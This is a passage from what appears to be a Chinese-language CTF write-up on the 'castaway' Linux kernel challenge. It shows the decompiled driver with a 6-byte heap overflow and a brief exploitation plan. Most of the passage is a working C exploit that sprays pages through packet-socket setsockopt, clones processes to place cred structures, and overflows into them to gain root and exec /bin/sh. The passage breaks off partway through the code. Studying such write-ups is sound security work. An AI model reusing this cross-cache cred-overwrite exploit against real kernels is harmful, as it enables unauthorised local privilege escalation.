class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">3</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, a3, <span class="number">24LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      v3 = castaway_edit(v6[<span class="number">0</span>], v6[<span class="number">1</span>], v6[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_lock(&amp;castaway_lock);</span><br><span class="line">  v3 = castaway_ctr;</span><br><span class="line">  <span class="keyword">if</span> ( castaway_ctr &lt;= <span class="number">399</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++castaway_ctr;</span><br><span class="line">    v5 = (_QWORD *)(castaway_arr + <span class="number">8</span> * v3);</span><br><span class="line">    *v5 = kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="number">8</span> * v3) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))castaway_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的castaway_add就是简单的从kmem_cache中申请一个obj</p><p>但是castaway_edit中存在一个溢出漏洞,会溢出6个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">size_t</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18F</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  _check_object_size(src, a2, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(src, a3, a2) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) + <span class="number">6LL</span>), src, a2);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编辑堆块时应该传入如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为是复现,所以就直接说明思路了</p><ol><li><p>首先排干原有的cred_jar</p></li><li><p>接着通过setsockopt进行大量的基于buddy system的页级内存分配</p><p>可以看到内核刚启动时,buddy system中也并没有太多低order的空闲页</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoR:~$ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      0      0      0      1      1     </span><br><span class="line">Node 0, zone    DMA32      3      2      2      2      0      1      2      3      2      2     </span><br><span class="line">Node 0, zone   Normal      2      2      2      2      0      2      1      2      2      2    </span><br></pre></td></tr></table></figure><p>那么当进行大量分配时,必然会取到许多原本是物理相邻的页</p></li><li><p>之后我们再每间隔一个页便释放掉一个,然后再大量clone进程(使用clone能够减少一些噪声影响),其中最主要的希望这些被释放的页被cred_jar使用</p></li><li><p>继续释放剩余的页,并将其申请为castaway_cache的slab页,然后触发所有object的溢出漏洞,寄希望能够出现某一个object溢出后刚好修改位于下一个页的cred结构体</p></li><li><p>进行询问操作,判断是否存在子进程的uid被成功修改</p></li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM 514</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">    .tv_sec = <span class="number">1145141919</span>,</span><br><span class="line">    .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>], check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> root_str[] = <span class="string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xCAFEBABE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int64_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">        .index = index,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xF00DBABE</span>, &amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rdi, rdi; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rax, rax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   cmp rax, 0; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdi, 1; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rsi, [root_str]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdx, 80; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 1;&quot;</span>    <span class="comment">/* write(1, root_str, 71) */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rdx, rdx;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rsi, rsi; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor rsi, rsi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor rdx, rdx; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r10, r10; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r8, r8;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; xor r9, r9;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; mov rax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; cmp rax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span 